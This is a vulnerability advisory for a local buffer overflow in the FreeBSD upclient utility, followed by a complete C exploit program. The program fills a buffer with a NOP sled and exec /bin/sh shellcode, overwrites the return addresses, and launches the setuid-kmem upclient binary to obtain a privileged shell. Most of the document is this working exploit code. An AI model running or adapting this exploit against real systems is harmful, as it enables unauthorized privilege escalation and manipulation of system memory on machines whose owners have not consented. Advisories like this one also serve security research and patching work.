source: http://www.securityfocus.com/bid/7703/info

upclient has been reported prone to a buffer overflow vulnerability when handling command line arguments of excessive length.

It is possible for a local attacker to seize control of the vulnerable application and have malicious arbitrary code executed in the context of upclient. Typically setuid kmem.

An attacker may harness elevated privileges obtained in this way to manipulate arbitrary areas in system memory through /dev/mem or /dev/kmem devices.

/*
*
* NuxAcid - UPCLIENT Local Buffer Overflow Exploit
* written on/for FreeBSD
* tested against UpClient 5.0b7 on FreeBSD 4.8
* for FreeBSD 5.x the code has to be tweaked
* other versions may be vulnerable too
*
* 2003 by Gino Thomas, http://www.nux-acid.org
*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define BUFFERSIZE 1022


unsigned long get_sp(void) {
 __asm__("movl %esp, %eax");
}

int main(int argc, char **argv)
{
  char buffer[BUFFERSIZE] = "";

//FreeBSD exec/setuid Shellcode
static char shellcode[] =
"\xeb\x23\x5e\x8d\x1e\x89\x5e\x0b\x31\xd2\x89\x56\x07\x89\x56\x0f"
"\x89\x56\x14\x88\x56\x19\x31\xc0\xb0\x3b\x8d\x4e\x0b\x89\xca\x52"
"\x51\x53\x50\xeb\x18\xe8\xd8\xff\xff\xff/bin/sh\x01\x01\x01\x01"
"\x02\x02\x02\x02\x03\x03\x03\x03\x9a\x04\x04\x04\x04\x07\x04";

memset(buffer, 0x90 ,sizeof(buffer));
*(long *)&buffer[BUFFERSIZE - 4] = 0xbfbffb21;
*(long *)&buffer[BUFFERSIZE - 8] = 0xbfbffb21;
*(long *)&buffer[BUFFERSIZE - 16] = 0xbfbffb21;
memcpy(buffer + BUFFERSIZE - 16 - strlen(shellcode), shellcode, strlen(shellcode));

execl("/usr/local/sbin/upclient","upclient", "-p", buffer, NULL);
return 0;
}
